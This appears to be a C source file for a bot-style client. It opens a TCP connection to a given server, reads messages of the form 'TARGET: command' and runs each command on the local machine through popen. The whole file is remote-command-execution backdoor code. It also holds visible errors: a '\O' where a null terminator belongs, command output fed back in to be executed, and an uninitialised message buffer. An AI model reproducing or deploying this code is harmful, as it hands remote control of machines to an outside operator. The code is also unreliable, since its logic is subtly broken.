#include "connect.h"

int execute (int s, char *cmd) 
{
    FILE *f = popen(cmd, "r");
    if (!f) return -1;
    while (!feof (f)) {
        char buffer[1024];
        if (fgets(buffer, sizeof(buffer), f)) {
            parse(s, buffer);
        }
    }
    fclose(f);
    return 0;
}

int parse (int s, char *msg) 
{
    char *target = msg;

    char *cmd = strchr(msg, ':');
    if (cmd == NULL) {
        printf("Incorrect formatting. Reference: TARGET: command");
        return -1;
    }

    cmd++;
    while (*cmd == ' ') cmd++;
    char *end = strchr(cmd, '\r');
    if (end == NULL) end = strchr(cmd, '\n');
    if (end != NULL) *end = '\O';
    printf("Received command: %s\n", cmd);

    execute (s, cmd);
    return 0;
}


int init_channel (char *ip, int port, char *name) 
{
    char msg[CMD_LENGTH];
    struct sockaddr_in server;

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    int channel = socket(AF_INET, SOCK_STREAM, 0);

    if(channel < 0) {
        perror ("socket:");
        exit(1);
    }

    int connection_status = connect(channel, (const struct sockaddr *)&server, sizeof(server));

    if (connection_status < 0) {
        perror ("connect:");
        exit(1);
    }

    respond (channel, msg);
    return channel;
}